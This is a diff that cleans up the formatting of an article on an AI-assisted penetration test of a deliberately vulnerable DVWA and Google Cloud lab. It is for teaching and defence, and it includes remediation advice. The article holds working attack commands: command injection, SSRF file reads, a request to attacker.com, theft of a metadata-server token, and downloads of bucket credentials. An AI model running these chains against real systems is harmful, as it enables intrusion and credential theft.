@@ -56,11 +56,11 @@ This page mirrors the original Medium article into the 1200km.com Docusaurus eco
 
 This article documents a comprehensive penetration test conducted using an innovative AI-assisted methodology that combines:
 
-- **Cursor AI:**An intelligent code editor with advanced AI capabilities
+- **Cursor AI:** An intelligent code editor with advanced AI capabilities
 
-- **HexStrike MCP:**A Model Context Protocol server providing 150+ cybersecurity tools
+- **HexStrike MCP:** A Model Context Protocol server providing 150+ cybersecurity tools
 
-- **Burp Suite MCP:**Professional web application security testing via MCP integration This approach represents a paradigm shift in penetration testing, where AI doesn’t just automate tasks but actively reasons, adapts, and makes intelligent decisions throughout the testing process.
+- **Burp Suite MCP:** Professional web application security testing via MCP integration This approach represents a paradigm shift in penetration testing, where AI doesn’t just automate tasks but actively reasons, adapts, and makes intelligent decisions throughout the testing process.
 
 ### What Makes This Different?
 
@@ -90,61 +90,34 @@ This article documents a comprehensive penetration test conducted using an innov
 
 Model Context Protocol is a standardized way for AI assistants to interact with external tools and services. It enables:
 
-- **Tool Discovery:**AI can discover available tools dynamically
+- **Tool Discovery:** AI can discover available tools dynamically
 
-- **Structured Communication:**Standardized request/response format
+- **Structured Communication:** Standardized request/response format
 
-- **Error Handling:**Graceful degradation when tools fail
+- **Error Handling:** Graceful degradation when tools fail
 
-- **Extensibility:**Easy addition of new tools and capabilities
+- **Extensibility:** Easy addition of new tools and capabilities
 
 ## HexStrike MCP Configuration
 
 [**HexStrike AI: Install, Configure, and Run MCP with Gemini, OpenAI, Cursor, Llama**
 [A practical, end-to-end guide to installing HexStrike AI, wiring it as an MCP server, and running real tool-driven…](../2025/2025-12-18-hexstrike-ai-install-configure-and-run-mcp-with-gemini-openai-cursor-llama-85a0e5752949.md)
 
-**Location:**`/home/andrey/.cursor/mcp.json`
+**Location:** `/home/andrey/.cursor/mcp.json`
 
 ```text
 {
-"mcpServers"
-:
- 
-{
-"hexstrike-ai"
-:
- 
-{
-"command"
-:
- 
-"python3"
-,
-"args"
-:
- 
-[
-"/home/andrey/hexstrike-ai/hexstrike_mcp.py"
-,
-" - server"
-,
+"mcpServers": {
+"hexstrike-ai": {
+"command": "python3",
+"args": [
+"/home/andrey/hexstrike-ai/hexstrike_mcp.py",
+" - server",
 "http://127.0.0.1:8889"
-]
-,
-"description"
-:
- 
-"HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform"
-,
-"timeout"
-:
- 
-300
-,
-"disabled"
-:
- 
-false
+],
+"description": "HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform",
+"timeout": 300,
+"disabled": false
 }
 }
 }
@@ -152,13 +125,13 @@ false
 
 **Key Features:**
 
-- **150+ Security Tools:**Nmap, sqlmap, nuclei, nikto, subfinder, and many more
+- **150+ Security Tools:** Nmap, sqlmap, nuclei, nikto, subfinder, and many more
 
-- **Unified Interface:**All tools accessible through a single MCP connection
+- **Unified Interface:** All tools accessible through a single MCP connection
 
-- **Real-time Logging:**Enhanced telemetry and error handling
+- **Real-time Logging:** Enhanced telemetry and error handling
 
-- **Tool Orchestration:**AI can chain tools intelligently
+- **Tool Orchestration:** AI can chain tools intelligently
 
 ## Burp Suite MCP Configuration
 
@@ -167,39 +140,25 @@ false
 
 ```text
 {
-"burp"
-:
- 
-{
-"url"
-:
- 
-"http://127.0.0.1:9876/sse"
-,
-"timeout"
-:
- 
-30000
-,
-"trust"
-:
- 
-false
+"burp": {
+"url": "http://127.0.0.1:9876/sse",
+"timeout": 30000,
+"trust": false
 }
 }
 ```
 
 **Key Features:**
 
-- **HTTP Proxy:**Intercept and modify HTTP requests
+- **HTTP Proxy:** Intercept and modify HTTP requests
 
-- **Request/Response Analysis:**Deep inspection of web traffic
+- **Request/Response Analysis:** Deep inspection of web traffic
 
-- **Scanner Integration:**Automated vulnerability scanning
+- **Scanner Integration:** Automated vulnerability scanning
 
-- **History Management:**Track all HTTP interactions
+- **History Management:** Track all HTTP interactions
 
-- **Repeater/Intruder:**Manual testing and fuzzing capabilities
+- **Repeater/Intruder:** Manual testing and fuzzing capabilities
 
 <img src="https://cdn-images-1.medium.com/max/800/1*urfIlqtk0dlWhvSJIY8M5w.png" alt="Article image" width="1247" height="654" loading="lazy" decoding="async" />
 
@@ -207,84 +166,24 @@ false
 
 ```text
 {
-  
-"mcpServers"
-:
- 
-{
-    
-"hexstrike-ai"
-:
- 
-{
-      
-"command"
-:
- 
-"python3"
-,
-      
-"args"
-:
- 
-[
-        
-"/home/andrey/hexstrike-ai/hexstrike_mcp.py"
-,
-        
-"--server"
-,
-        
-"http://127.0.0.1:8888"
-      
-]
-,
-      
-"description"
-:
- 
-"HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform"
-,
-      
-"timeout"
-:
- 
-300
-,
-      
-"disabled"
-:
- 
-false
-    
-}
-,
-    
-"burp"
-:
- 
-{
-      
-"url"
-:
- 
-"http://127.0.0.1:9876/sse"
-,
-      
-"timeout"
-:
- 
-30000
-,
-      
-"trust"
-:
- 
-false
-    
-}
-  
-}
+  "mcpServers": {
+    "hexstrike-ai": {
+      "command": "python3",
+      "args": [
+        "/home/andrey/hexstrike-ai/hexstrike_mcp.py",
+        "--server",
+        "http://127.0.0.1:8888"
+      ],
+      "description": "HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform",
+      "timeout": 300,
+      "disabled": false
+    },
+    "burp": {
+      "url": "http://127.0.0.1:9876/sse",
+      "timeout": 30000,
+      "trust": false
+    }
+  }
 }
 ```
 
@@ -292,9 +191,7 @@ false
 
 ```text
 ┌─────────────┐
-│ 
-Cursor
- AI │
+│ Cursor AI │
 │ (Brain) │
 └──────┬──────┘
 │
@@ -308,9 +205,7 @@ Cursor
 │ │
 ▼ ▼
 ┌─────────────┐ ┌─────────────┐
-│ 
-150
-+ Tools │ │ HTTP Proxy │
+│ 150+ Tools │ │ HTTP Proxy │
 │ (nmap, etc)│ │ Scanner, etc │
 └─────────────┘ └─────────────┘
 ```
@@ -321,7 +216,7 @@ The AI (Cursor) acts as the orchestrator, making intelligent decisions about whi
 
 ### Step 1: Install Cursor AI
 
-- Download Cursor from[https://cursor.sh](https://cursor.sh/)
+- Download Cursor from [https://cursor.sh](https://cursor.sh/)
 
 - Install following platform-specific instructions
 
@@ -333,15 +228,15 @@ The AI (Cursor) acts as the orchestrator, making intelligent decisions about whi
 
 - Python 3.8+
 
-- HexStrike AI server running on`http://127.0.0.1:8889`**Configuration:**
+- HexStrike AI server running on `http://127.0.0.1:8889` **Configuration:**
 
-- Edit`/home/andrey/.cursor/mcp.json`
+- Edit `/home/andrey/.cursor/mcp.json`
 
 - Add HexStrike MCP configuration (see above)
 
 - Restart Cursor to load MCP servers
 
-- Verify connection in Cursor’s MCP status**Verification:**
+- Verify connection in Cursor’s MCP status **Verification:**
 
 ```text
 # Check if HexStrike server is running
@@ -360,17 +255,17 @@ curl http://127.0.0.1:8889/health
 
 - Burp MCP extension installed
 
-- Burp MCP server running on`http://127.0.0.1:9876/sse`**Setup Steps:**
+- Burp MCP server running on `http://127.0.0.1:9876/sse` **Setup Steps:**
 
 - Install Burp Suite MCP extension
 
-- Configure Burp to listen on`127.0.0.1:9876`
+- Configure Burp to listen on `127.0.0.1:9876`
 
 - Enable Server-Sent Events (SSE) endpoint
 
-- Add Burp configuration to`mcp.json`(see above)
+- Add Burp configuration to `mcp.json` (see above)
 
-- Restart Cursor**Verification:**
+- Restart Cursor **Verification:**
 
 ```text
 # Test Burp MCP endpoint
@@ -382,9 +277,9 @@ curl http://127.0.0.1:9876/sse
 
 Once both MCP servers are configured, Cursor AI should have access to:
 
-- **From HexStrike:**150+ security tools (nmap, sqlmap, nuclei, etc.)
+- **From HexStrike:** 150+ security tools (nmap, sqlmap, nuclei, etc.)
 
-- **From Burp:**HTTP proxy, scanner, repeater, intruder capabilities You can verify by asking Cursor to list available tools or by attempting to use a tool. — -
+- **From Burp:** HTTP proxy, scanner, repeater, intruder capabilities You can verify by asking Cursor to list available tools or by attempting to use a tool. — -
 
 <img src="https://cdn-images-1.medium.com/max/800/1*swhB2jBeqw-uxeQSZkHK6A.png" alt="Article image" width="938" height="350" loading="lazy" decoding="async" />
 
@@ -406,7 +301,7 @@ The historical lab IP is defanged in this prompt. Substitute only a target you o
 
 &gt; “I have a single URL as the entry point. This is a blackbox test, so I have no prior knowledge. I need to start with reconnaissance to understand what I’m dealing with. The standard approach is: port scanning → service enumeration → web application testing → vulnerability discovery → exploitation.”
 
-**Decision:**Start with port scanning to identify open services.
+**Decision:** Start with port scanning to identify open services.
 
 ### First Tool Selection: HexStrike MCP or Direct Command?
 
@@ -414,25 +309,20 @@ The historical lab IP is defanged in this prompt. Substitute only a target you o
 
 &gt; “I need to scan ports. I have two options:
 
-- Use HexStrike MCP’s`nmap_scan`tool
+- Use HexStrike MCP’s `nmap_scan` tool
 
-- Use direct`nmap`command
+- Use direct `nmap` command
 
 &gt; MCP tools provide structured output and logging, but for a simple port scan, direct commands might be faster. However, using MCP maintains consistency and allows for better tool orchestration. Let me try HexStrike MCP first.”
 
-**Action:**Attempt to use HexStrike MCP
+**Action:** Attempt to use HexStrike MCP
 
 ```text
 # AI attempts MCP call
 result = mcp_hexstrike_ai_nmap_scan(
-    target=
-"34.121.191.196"
-,
-    scan_type=
-"-sV"
-,
-    ports=
-"22,80,443,8080,8443,3306,5432"
+    target="34.121.191.196",
+    scan_type="-sV",
+    ports="22,80,443,8080,8443,3306,5432"
 )
 ```
 
@@ -441,8 +331,7 @@ result = mcp_hexstrike_ai_nmap_scan(
 **Error Received:**
 
 ```text
-Connection refused: http:
-//127.0.0.1:8889
+Connection refused: http://127.0.0.1:8889
 ```
 
 **AI Reasoning:**
@@ -459,29 +348,10 @@ Connection refused: http:
 
 &gt; “HexStrike MCP is unavailable. I’ll use direct nmap command instead. This is slower but still effective.”
 
-**Action:**Execute direct command
+**Action:** Execute direct command
 
 ```text
-nmap -sV -sC -
-p
- 
-22
-,
-80
-,
-443
-,
-8080
-,
-8443
-,
-3306
-,
-5432
- 
-34.121
-.
-191.196
+nmap -sV -sC -p 22,80,443,8080,8443,3306,5432 34.121.191.196
 ```
 
 **Result:**
@@ -536,7 +406,7 @@ Set-Cookie: PHPSESSID=...
 
 &gt; I should check for information disclosure first — it’s often overlooked and can reveal additional attack surface.”
 
-**Decision:**Check common information disclosure endpoints.
+**Decision:** Check common information disclosure endpoints.
 
 ### Information Disclosure: The Critical Discovery
 
@@ -572,9 +442,7 @@ Storage Bucket: gs://vulnerable-bucket-39ca4c40
 Endpoints:
 - ?cmd= - Command execution
 - ?url= - URL fetching
-- ?
-env
-= - Environment variables
+- ?env= - Environment variables
 - ?secret= - Secret key
 ```
 
@@ -598,7 +466,7 @@ env
 
 &gt; Strategy shift: Instead of focusing on the hardened main application, I should test these cloud services. They’re likely less protected.”
 
-**Decision:**Pivot to testing cloud services.
+**Decision:** Pivot to testing cloud services.
 
 ### Cloud Function Testing: Tool Selection Dilemma
 
@@ -617,11 +485,10 @@ env
 **Action — Testing Command Injection:**
 
 ```text
-curl -s 
-"https://...cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami"
+curl -s "https://...cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami"
 ```
 
-**Result:**`www-data`
+**Result:** `www-data`
 
 **AI Reasoning:**
 
@@ -640,11 +507,10 @@ curl -s
 **Action — Testing SSRF:**
 
 ```text
-curl -s 
-"...?url=file:///etc/passwd"
+curl -s "...?url=file:///etc/passwd"
 ```
 
-**Result:**Successfully read /etc/passwd
+**Result:** Successfully read /etc/passwd
 
 **AI Reasoning:**
 
@@ -653,12 +519,10 @@ curl -s
 **Action — Testing Environment Variables:**
 
 ```text
-curl -s 
-"...?env=1"
- | python3 -m json.tool
+curl -s "...?env=1" | python3 -m json.tool
 ```
 
-**Result:**Full JSON of environment variables including SECRET_KEY
+**Result:** Full JSON of environment variables including SECRET_KEY
 
 **AI Reasoning:**
 
@@ -695,13 +559,12 @@ curl -s
 **Action:**
 
 ```text
-curl 
-"...?cmd=python3+-c+import+urllib.request,json;req=urllib.request.Request('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token');req.add_header('Metadata-Flavor','Google');token=json.loads(urllib.request.urlopen(req).read().decode());print(token['access_token'])"
+curl "...?cmd=python3+-c+import+urllib.request,json;req=urllib.request.Request('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token');req.add_header('Metadata-Flavor','Google');token=json.loads(urllib.request.urlopen(req).read().decode());print(token['access_token'])"
 ```
 
 **Troubleshooting Scenario 2: URL Encoding Issues**
 
-**Initial Attempt Failed:**The command didn’t work because of special characters.
+**Initial Attempt Failed:** The command didn’t work because of special characters.
 
 **AI Reasoning:**
 
@@ -715,11 +578,10 @@ curl
 
 ```text
 # Test metadata access
-curl 
-"...?cmd=curl+-H+Metadata-Flavor:Google+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+curl "...?cmd=curl+-H+Metadata-Flavor:Google+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
 ```
 
-**Result:**Successfully obtained access token!
+**Result:** Successfully obtained access token!
 
 **AI Reasoning:**
 
@@ -752,51 +614,24 @@ curl
 **Actions:**
 
 ```text
-TOKEN=
-"<access_token>"
+TOKEN="<access_token>"
 # List storage buckets
-curl -H 
-"Authorization: Bearer 
-$TOKEN
-"
- \
-  
-"https://storage.googleapis.com/storage/v1/b?project=cloud-pentest-lab-1769759595"
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://storage.googleapis.com/storage/v1/b?project=cloud-pentest-lab-1769759595"
 ```
 
 **Result:**
 
 ```text
 {
-  
-"items"
-:
- 
-[
-    
-{
-      
-"name"
-:
- 
-"vulnerable-bucket-39ca4c40"
-,
-      
-"iamConfiguration"
-:
- 
-{
-        
-"publicAccessPrevention"
-:
- 
-"inherited"
-      
-}
-    
-}
-  
-]
+  "items": [
+    {
+      "name": "vulnerable-bucket-39ca4c40",
+      "iamConfiguration": {
+        "publicAccessPrevention": "inherited"
+      }
+    }
+  ]
 }
 ```
 
@@ -807,11 +642,10 @@ $TOKEN
 **Action — Testing Public Access:**
 
 ```text
-curl 
-"https://storage.googleapis.com/vulnerable-bucket-39ca4c40/"
+curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/"
 ```
 
-**Result:**Successfully listed bucket contents!
+**Result:** Successfully listed bucket contents!
 
 **AI Reasoning:**
 
@@ -820,40 +654,19 @@ curl
 **Action — Downloading Files:**
 
 ```text
-curl 
-"https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json"
+curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json"
 ```
 
 **Result:**
 
 ```text
 {
-  
-"api_key"
-:
- 
-"stripe_live_example_39ca4c40"
-,
-  
-"db_host"
-:
- 
-"internal-db-39ca4c40"
-,
-  
-"db_password"
-:
- 
-"EXAMPLE_PASSWORD_123!"
-,
-  
-"db_user"
-:
- 
-"admin"
+  "api_key": "stripe_live_example_39ca4c40",
+  "db_host": "internal-db-39ca4c40",
+  "db_password": "EXAMPLE_PASSWORD_123!",
+  "db_user": "admin"
 }
 ```
-
 **AI Reasoning:**
 
 &gt; “This is devastating. I now have:
@@ -869,15 +682,10 @@ curl
 **Action — Downloading Source Code:**
 
 ```text
-curl 
-"https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip"
- -o 
-function
--code.
-zip
+curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip" -o function-code.zip
 ```
 
-**Result:**Downloaded complete Cloud Function source code
+**Result:** Downloaded complete Cloud Function source code
 
 **AI Reasoning:**
 
@@ -886,27 +694,17 @@ zip
 **Action — Enumerating Service Accounts:**
 
 ```text
-curl -H 
-"Authorization: Bearer 
-$TOKEN
-"
- \
-  
-"https://iam.googleapis.com/v1/projects/cloud-pentest-lab-1769759595/serviceAccounts"
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://iam.googleapis.com/v1/projects/cloud-pentest-lab-1769759595/serviceAccounts"
 ```
 
 **Result:**
 
 ```text
 {
-  
-"accounts"
-: [
+  "accounts": [
     {
-      
-"email"
-: 
-"overprivileged-sa-39ca4c40@cloud-pentest-lab-1769759595.iam.gserviceaccount.com"
+      "email": "overprivileged-sa-39ca4c40@cloud-pentest-lab-1769759595.iam.gserviceaccount.com"
     }
   ]
 }
@@ -919,14 +717,11 @@ $TOKEN
 **Action — Checking Permissions:**
 
 ```text
-curl -H 
-"Authorization: Bearer $TOKEN"
- \
-  
-"https://iam.googleapis.com/v1/projects/cloud-pentest-lab-1769759595/serviceAccounts/overprivileged-sa-39ca4c40@cloud-pentest-lab-1769759595.iam.gserviceaccount.com:getIamPolicy"
+curl -H "Authorization: Bearer $TOKEN" \
+  "https://iam.googleapis.com/v1/projects/cloud-pentest-lab-1769759595/serviceAccounts/overprivileged-sa-39ca4c40@cloud-pentest-lab-1769759595.iam.gserviceaccount.com:getIamPolicy"
 ```
 
-**Result:**Service account has`roles/owner`- full project access!
+**Result:** Service account has `roles/owner` - full project access!
 
 **AI Reasoning:**
 
@@ -950,35 +745,18 @@ curl -H
 
 ```text
 # AI attempts HexStrike MCP
-result 
-=
- mcp_hexstrike_ai_sqlmap_scan
-(
-    url
-=
-"http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit"
-,
-    cookie
-=
-"security=low; PHPSESSID=test123"
-,
-    level
-=
-5
-,
-    risk
-=
-3
-,
-    batch
-=
-True
+result = mcp_hexstrike_ai_sqlmap_scan(
+    url="http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit",
+    cookie="security=low; PHPSESSID=test123",
+    level=5,
+    risk=3,
+    batch=True
 )
 ```
 
 **Troubleshooting Scenario 3: SQLmap Session Issues**
 
-**Problem:**SQLmap keeps getting redirected to login.php
+**Problem:** SQLmap keeps getting redirected to login.php
 
 **AI Reasoning:**
 
@@ -1000,32 +778,17 @@ True
 
 ```text
 # Login and capture session
-curl -c cookies.txt -d 
-"username=admin&password=admin&Login=Login"
- \
-  http:
-//
-34.121
-.
-191.196
-/login.php
+curl -c cookies.txt -d "username=admin&password=admin&Login=Login" \
+  http://34.121.191.196/login.php
 # Extract PHPSESSID
-PHPSESSID=$(
-grep
- PHPSESSID cookies.txt | awk 
-'{print $7}'
-)
+PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
 # Retry sqlmap with proper cookies
-sqlmap -u 
-"http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit"
- \
-  --cookie=
-"security=low; PHPSESSID=$PHPSESSID"
- \
+sqlmap -u "http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=$PHPSESSID" \
   --batch
 ```
 
-**Result:**SQLmap now runs successfully (though security level ‘impossible’ may prevent exploitation)
+**Result:** SQLmap now runs successfully (though security level ‘impossible’ may prevent exploitation)
 
 **AI Reasoning:**
 
@@ -1035,24 +798,17 @@ sqlmap -u
 
 ```text
 # AI attempts Burp MCP
-try
-:
+try:
     history = mcp_burp_get_proxy_http_history()
-    
-# Analyze requests
-except
- Exception 
-as
- e:
-    
-# Burp MCP not available
-    
-pass
+    # Analyze requests
+except Exception as e:
+    # Burp MCP not available
+    pass
 ```
 
 **Troubleshooting Scenario 4: Burp MCP Not Available**
 
-**Error:**Timeout or connection refused
+**Error:** Timeout or connection refused
 
 **AI Reasoning:**
 
@@ -1102,129 +858,71 @@ pass
 
 &gt; I should now compile this into a comprehensive report with proofs, impact assessment, and recommendations.”
 
-**Decision:**Generate comprehensive documentation with all findings, proofs, and remediation recommendations.
+**Decision:** Generate comprehensive documentation with all findings, proofs, and remediation recommendations.
 
 ## Full PT Report (Generated by AI)
 
-```text
+````text
 # Full Penetration Test Report
 ## Target: http://34.121.191.196
-**Date:**
- January 31, 2026  
-**Tester:**
- AI-Assisted Penetration Test (Cursor + HexStrike + Burp Suite)  
-**Target Type:**
- Web Application + Cloud Environment (Google Cloud Platform)
+
+**Date:** January 31, 2026  
+**Tester:** AI-Assisted Penetration Test (Cursor + HexStrike + Burp Suite)  
+**Target Type:** Web Application + Cloud Environment (Google Cloud Platform)
+
 ---
+
 ## Executive Summary
-A comprehensive penetration test was conducted on the target web application and its associated cloud infrastructure. The assessment revealed 
-**multiple critical vulnerabilities**
- across both the web application and cloud environment, including command injection, SSRF, information disclosure, and misconfigured cloud services.
+
+A comprehensive penetration test was conducted on the target web application and its associated cloud infrastructure. The assessment revealed **multiple critical vulnerabilities** across both the web application and cloud environment, including command injection, SSRF, information disclosure, and misconfigured cloud services.
+
 ### Risk Summary
--
- 
-**Critical:**
- 4 vulnerabilities
--
- 
-**High:**
- 3 vulnerabilities  
--
- 
-**Medium:**
- 2 vulnerabilities
--
- 
-**Low:**
- 2 vulnerabilities
+- **Critical:** 4 vulnerabilities
+- **High:** 3 vulnerabilities  
+- **Medium:** 2 vulnerabilities
+- **Low:** 2 vulnerabilities
+
 ### Key Findings
-1.
- 
-**Command Injection in Cloud Function**
- - Remote code execution possible
-2.
- 
-**SSRF in Cloud Function**
- - Can access internal services and read local files
-3.
- 
-**Publicly Accessible Storage Bucket**
- - Sensitive credentials exposed
-4.
- 
-**Exposed .git Repository**
- - Source code disclosure
-5.
- 
-**Information Disclosure**
- - Internal service URLs and credentials exposed
+1. **Command Injection in Cloud Function** - Remote code execution possible
+2. **SSRF in Cloud Function** - Can access internal services and read local files
+3. **Publicly Accessible Storage Bucket** - Sensitive credentials exposed
+4. **Exposed .git Repository** - Source code disclosure
+5. **Information Disclosure** - Internal service URLs and credentials exposed
+
 ---
+
 ## 1. Target Information
+
 ### 1.1 Infrastructure Details
--
- 
-**IP Address:**
- 34.121.191.196
--
- 
-**Hostname:**
- 196.191.121.34.bc.googleusercontent.com
--
- 
-**Cloud Provider:**
- Google Cloud Platform
--
- 
-**Project ID:**
- cloud-pentest-lab-1769759595
--
- 
-**Region:**
- us-central1
+- **IP Address:** 34.121.191.196
+- **Hostname:** 196.191.121.34.bc.googleusercontent.com
+- **Cloud Provider:** Google Cloud Platform
+- **Project ID:** cloud-pentest-lab-1769759595
+- **Region:** us-central1
+
 ### 1.2 Services Identified
--
- 
-**Port 22:**
- OpenSSH 8.4p1 Debian 5+deb11u5
--
- 
-**Port 80:**
- nginx 1.18.0 (HTTP)
--
- 
-**Web Application:**
- Damn Vulnerable Web Application (DVWA)
+- **Port 22:** OpenSSH 8.4p1 Debian 5+deb11u5
+- **Port 80:** nginx 1.18.0 (HTTP)
+- **Web Application:** Damn Vulnerable Web Application (DVWA)
+
 ### 1.3 Cloud Services Discovered
--
- 
-**Cloud Function:**
- 
-`vulnerable-function-39ca4c40`
--
- 
-**Cloud Run:**
- 
-`vulnerable-api-39ca4c40`
--
- 
-**Storage Bucket:**
- 
-`vulnerable-bucket-39ca4c40`
+- **Cloud Function:** `vulnerable-function-39ca4c40`
+- **Cloud Run:** `vulnerable-api-39ca4c40`
+- **Storage Bucket:** `vulnerable-bucket-39ca4c40`
+
 ---
+
 ## 2. Critical Vulnerabilities
+
 ### 2.1 Command Injection in Cloud Function (CRITICAL)
-**Severity:**
- Critical  
-**CVSS Score:**
- 9.8 (Critical)  
-**CWE:**
- CWE-78 (OS Command Injection)
+
+**Severity:** Critical  
+**CVSS Score:** 9.8 (Critical)  
+**CWE:** CWE-78 (OS Command Injection)
+
 #### Description
-The Cloud Function at 
-`https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40`
- contains a command injection vulnerability in the 
-`cmd`
- parameter. The application directly executes user-supplied commands without proper sanitization.
+The Cloud Function at `https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40` contains a command injection vulnerability in the `cmd` parameter. The application directly executes user-supplied commands without proper sanitization.
+
 #### Vulnerable Code
 ```python
 if 'cmd' in request.args:
@@ -1234,48 +932,44 @@ if 'cmd' in request.args:
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
     return result.stdout
 ```
+
 #### Proof of Concept
 ```bash
 # Execute arbitrary commands
 curl "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?cmd=id"
 # Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
 curl "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami"
 # Response: www-data
+
 curl "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?cmd=cat+/etc/passwd"
 # Response: [Full /etc/passwd file contents]
 ```
+
 #### Impact
--
- Complete compromise of the Cloud Function execution environment
--
- Ability to read sensitive files
--
- Potential for lateral movement within the cloud environment
--
- Data exfiltration possible
+- Complete compromise of the Cloud Function execution environment
+- Ability to read sensitive files
+- Potential for lateral movement within the cloud environment
+- Data exfiltration possible
+
 #### Recommendation
-1.
- Remove direct command execution functionality
-2.
- Use parameterized commands with whitelisted operations
-3.
- Implement proper input validation and sanitization
-4.
- Use least privilege service accounts
-5.
- Implement command execution logging and monitoring
+1. Remove direct command execution functionality
+2. Use parameterized commands with whitelisted operations
+3. Implement proper input validation and sanitization
+4. Use least privilege service accounts
+5. Implement command execution logging and monitoring
+
 ---
+
 ### 2.2 Server-Side Request Forgery (SSRF) in Cloud Function (CRITICAL)
-**Severity:**
- Critical  
-**CVSS Score:**
- 9.1 (Critical)  
-**CWE:**
- CWE-918 (Server-Side Request Forgery)
+
+**Severity:** Critical  
+**CVSS Score:** 9.1 (Critical)  
+**CWE:** CWE-918 (Server-Side Request Forgery)
+
 #### Description
-The Cloud Function contains an SSRF vulnerability in the 
-`url`
- parameter, allowing attackers to make arbitrary HTTP requests from the server, including to internal services and local files.
+The Cloud Function contains an SSRF vulnerability in the `url` parameter, allowing attackers to make arbitrary HTTP requests from the server, including to internal services and local files.
+
 #### Vulnerable Code
 ```python
 if 'url' in request.args:
@@ -1287,49 +981,43 @@ if 'url' in request.args:
     except Exception as e:
         return f"Error: {str(e)}"
 ```
+
 #### Proof of Concept
 ```bash
 # Read local files
 curl "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?url=file:///etc/passwd"
 # Response: [Contents of /etc/passwd]
+
 # Access external URLs
 curl "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?url=https://attacker.com"
 # Response: [HTML content from attacker.com]
 ```
+
 #### Impact
--
- Access to internal services and metadata
--
- Local file reading
--
- Potential access to cloud metadata service (though protected in this case)
--
- Port scanning from cloud infrastructure
--
- Bypass of network security controls
+- Access to internal services and metadata
+- Local file reading
+- Potential access to cloud metadata service (though protected in this case)
+- Port scanning from cloud infrastructure
+- Bypass of network security controls
+
 #### Recommendation
-1.
- Implement URL validation and whitelist allowed domains
-2.
- Block access to internal IP ranges (127.0.0.1, 169.254.169.254, 10.x.x.x, etc.)
-3.
- Block file:// protocol
-4.
- Use a proxy service with strict controls
-5.
- Implement network segmentation
+1. Implement URL validation and whitelist allowed domains
+2. Block access to internal IP ranges (127.0.0.1, 169.254.169.254, 10.x.x.x, etc.)
+3. Block file:// protocol
+4. Use a proxy service with strict controls
+5. Implement network segmentation
+
 ---
+
 ### 2.3 Publicly Accessible Storage Bucket with Sensitive Data (CRITICAL)
-**Severity:**
- Critical  
-**CVSS Score:**
- 9.1 (Critical)  
-**CWE:**
- CWE-200 (Information Exposure)
+
+**Severity:** Critical  
+**CVSS Score:** 9.1 (Critical)  
+**CWE:** CWE-200 (Information Exposure)
+
 #### Description
-The Google Cloud Storage bucket 
-`vulnerable-bucket-39ca4c40`
- is publicly accessible without authentication, exposing sensitive files including database credentials and function source code.
+The Google Cloud Storage bucket `vulnerable-bucket-39ca4c40` is publicly accessible without authentication, exposing sensitive files including database credentials and function source code.
+
 #### Proof of Concept
 ```bash
 # List bucket contents
@@ -1337,62 +1025,48 @@ curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/"
 # Response: XML listing showing:
 # - function-code.zip
 # - secrets/database-credentials.json
+
 # Access sensitive credentials
 curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json"
 # Response: {"api_key":"stripe_live_example_39ca4c40","db_host":"internal-db-39ca4c40","db_password":"EXAMPLE_PASSWORD_123!","db_user":"admin"}
+
 # Download function source code
 curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip" -o function-code.zip
 ```
+
 #### Exposed Data
--
- 
-**Database Credentials:**
-  -
- Host: internal-db-39ca4c40
-  -
- User: admin
-  -
- Password: EXAMPLE_PASSWORD_123!
-  -
- API Key: sk
-_live_
-39ca4c40
--
- 
-**Function Source Code:**
- Complete source code of vulnerable Cloud Function
+- **Database Credentials:**
+  - Host: internal-db-39ca4c40
+  - User: admin
+  - Password: EXAMPLE_PASSWORD_123!
+  - API Key: stripe_live_example_39ca4c40
+- **Function Source Code:** Complete source code of vulnerable Cloud Function
+
 #### Impact
--
- Complete database compromise possible
--
- Source code disclosure aids further exploitation
--
- API keys can be used for unauthorized access
--
- Violation of data protection regulations
+- Complete database compromise possible
+- Source code disclosure aids further exploitation
+- API keys can be used for unauthorized access
+- Violation of data protection regulations
+
 #### Recommendation
-1.
- Remove public access from the bucket
-2.
- Implement proper IAM policies
-3.
- Use signed URLs for temporary access
-4.
- Encrypt sensitive files at rest
-5.
- Rotate all exposed credentials immediately
-6.
- Implement bucket versioning and access logging
+1. Remove public access from the bucket
+2. Implement proper IAM policies
+3. Use signed URLs for temporary access
+4. Encrypt sensitive files at rest
+5. Rotate all exposed credentials immediately
+6. Implement bucket versioning and access logging
+
 ---
+
